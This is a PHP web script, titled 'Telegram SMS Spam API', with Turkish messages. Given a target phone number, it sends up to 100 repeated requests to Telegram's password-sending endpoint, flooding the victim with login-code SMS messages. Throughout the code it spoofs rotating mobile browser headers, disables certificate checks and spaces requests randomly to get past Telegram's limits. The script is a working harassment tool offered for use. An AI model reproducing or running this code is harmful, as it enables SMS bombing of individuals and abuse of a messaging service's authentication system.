<?php
/**
 * Telegram SMS Spam API
 * my.telegram.org/auth/send_password endpoint
 * telegram : @unutur
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$phone = isset($_GET['phone']) ? trim($_GET['phone']) : '';
$count = isset($_GET['count']) ? min((int)$_GET['count'], 100) : 10;

if (empty($phone)) {
    echo json_encode([
        'success' => false,
        'error' => '❌ Telefon numarası gerekli',
        'ornek' => '/?phone=905551234567&count=10',
        'format' => 'Uluslararası format (905551234567)',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// Telefon formatını temizle
$phone = preg_replace('/[^0-9]/', '', $phone);
if (strlen($phone) == 10) {
    $phone = '90' . $phone;
}

// Rate limit dosyası
$ip = $_SERVER['REMOTE_ADDR'];
$rate_file = __DIR__ . '/rate_' . md5($ip) . '.json';

if (file_exists($rate_file)) {
    $rate_data = json_decode(file_get_contents($rate_file), true);
    if ($rate_data['count'] >= 20 && (time() - $rate_data['last']) < 3600) {
        echo json_encode([
            'success' => false,
            'error' => '❌ Rate limit aşıldı. 1 saat bekleyin.',
            'limit' => 20,
            'wait_minutes' => 60 - ((time() - $rate_data['last']) / 60),
            'telegram' => '@unutur'
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }
}

function random_user_agent() {
    $agents = [
        'Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 Chrome/117.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; SM-A515F) AppleWebKit/537.36 Chrome/116.0.0.0 Mobile Safari/537.36'
    ];
    return $agents[array_rand($agents)];
}

function send_spam($phone, $count) {
    $success = 0;
    $fail = 0;
    $results = [];
    
    for ($i = 1; $i <= $count; $i++) {
        $headers = [
            'authority: my.telegram.org',
            'accept: application/json, text/javascript, */*; q=0.01',
            'accept-language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'origin: https://my.telegram.org',
            'referer: https://my.telegram.org/auth',
            'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile: ?1',
            'sec-ch-ua-platform: "Android"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: ' . random_user_agent(),
            'x-requested-with: XMLHttpRequest'
        ];
        
        $post_data = 'phone=' . urlencode($phone);
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://my.telegram.org/auth/send_password');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        $status = (strpos($response, 'random_hash') !== false);
        
        if ($status) {
            $success++;
            $results[] = ['request' => $i, 'status' => 'success', 'message' => '✅ SMS gönderildi'];
        } else {
            $fail++;
            $results[] = ['request' => $i, 'status' => 'failed', 'message' => '❌ Gönderilemedi'];
        }
        
        // Rate limit koruması
        if ($i < $count) {
            usleep(rand(500000, 1500000)); // 0.5-1.5 saniye bekle
        }
    }
    
    return [
        'success_count' => $success,
        'fail_count' => $fail,
        'total' => $count,
        'results' => $results
    ];
}

// Rate limit kaydet
if (!file_exists($rate_file)) {
    file_put_contents($rate_file, json_encode(['count' => $count, 'last' => time()]));
} else {
    $rate_data = json_decode(file_get_contents($rate_file), true);
    $rate_data['count'] += $count;
    $rate_data['last'] = time();
    file_put_contents($rate_file, json_encode($rate_data));
}

// Spam gönder
$result = send_spam($phone, $count);

echo json_encode([
    'success' => true,
    'target' => $phone,
    'total_requests' => $count,
    'success_count' => $result['success_count'],
    'fail_count' => $result['fail_count'],
    'success_rate' => round(($result['success_count'] / $count) * 100, 2) . '%',
    'details' => $result['results'],
    'telegram' => '@unutur'
], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
?>